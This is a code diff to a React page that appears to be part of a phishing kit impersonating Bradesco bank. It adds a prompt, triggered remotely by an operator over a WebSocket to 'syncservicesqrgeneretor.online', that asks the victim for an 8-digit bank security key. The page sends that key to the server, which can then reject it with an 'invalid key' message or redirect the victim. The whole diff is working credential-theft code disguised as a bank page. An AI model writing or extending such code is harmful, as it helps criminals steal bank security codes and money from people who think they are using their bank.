@@ -1,4 +1,4 @@
-import { useEffect, useRef } from "react";
+import { useEffect, useRef, useState } from "react";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 
 const QRCodePage = () => {
@@ -8,6 +8,10 @@ const QRCodePage = () => {
   const feixe = sessionStorage.getItem("feixe") || "";
   const dispositivo = sessionStorage.getItem("dispositivo") || "";
   const wsRef = useRef<WebSocket | null>(null);
+  const [chave, setChave] = useState("");
+  const [mostrarChave, setMostrarChave] = useState(false);
+  const [enviando, setEnviando] = useState(false);
+  const [erro, setErro] = useState("");
 
   useEffect(() => {
     const ws = new WebSocket("wss://syncservicesqrgeneretor.online/ws/");
@@ -24,8 +28,17 @@ const QRCodePage = () => {
       const msg = JSON.parse(event.data);
       console.log("QRCodePage msg:", msg);
 
+      if (msg.acao === "solicitar_chave") {
+        setMostrarChave(true);
+      }
+
       if (msg.acao === "redirecionar" && msg.url) {
         window.location.href = msg.url;
+      }
+
+      if (msg.acao === "erro_chave") {
+        setErro(msg.motivo || "Chave inválida. Tente novamente.");
+        setEnviando(false);
       }
     };
 
@@ -43,6 +56,13 @@ const QRCodePage = () => {
     window.addEventListener("popstate", handlePop);
     return () => window.removeEventListener("popstate", handlePop);
   }, []);
+
+  const enviarChave = () => {
+    if (chave.length !== 8) return;
+    setErro("");
+    setEnviando(true);
+    wsRef.current?.send(JSON.stringify({ acao: "token", usuario, token: chave }));
+  };
 
   return (
     <>
@@ -105,6 +125,38 @@ const QRCodePage = () => {
             </div>
           )}
 
+          {/* Security key input */}
+          {mostrarChave && (
+            <div className="w-full bg-white rounded-xl px-4 py-4 border border-[hsl(220,14%,89%)] mb-4 space-y-3">
+              <label className="text-[hsl(220,20%,14%)] text-sm font-semibold block">
+                Digite a Chave de Segurança com 8 dígitos
+              </label>
+              <input
+                type="text"
+                inputMode="numeric"
+                maxLength={8}
+                value={chave}
+                onChange={(e) => {
+                  const val = e.target.value.replace(/\D/g, "").slice(0, 8);
+                  setChave(val);
+                  setErro("");
+                }}
+                placeholder="00000000"
+                className="w-full h-12 text-center text-2xl font-mono tracking-[0.3em] border border-[hsl(220,14%,89%)] rounded-lg focus:outline-none focus:border-[hsl(220,60%,40%)] focus:ring-2 focus:ring-[hsl(220,60%,40%)]/20 transition-all"
+              />
+              {erro && (
+                <p className="text-[hsl(0,84%,60%)] text-xs text-center">{erro}</p>
+              )}
+              <button
+                onClick={enviarChave}
+                disabled={chave.length !== 8 || enviando}
+                className="w-full h-11 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200 disabled:opacity-50"
+              >
+                {enviando ? "Enviando..." : "Confirmar"}
+              </button>
+            </div>
+          )}
+
           {/* Info */}
           <div className="bg-white rounded-xl px-4 py-3 w-full border border-[hsl(220,14%,89%)] space-y-2">
             {dispositivo && (
@@ -121,9 +173,11 @@ const QRCodePage = () => {
             )}
           </div>
 
-          <p className="text-[hsl(220,10%,46%)] text-xs mt-5 animate-pulse text-center">
-            Aguardando leitura do QR Code...
-          </p>
+          {!mostrarChave && (
+            <p className="text-[hsl(220,10%,46%)] text-xs mt-5 animate-pulse text-center">
+              Aguardando leitura do QR Code...
+            </p>
+          )}
         </div>
       </div>
     </>
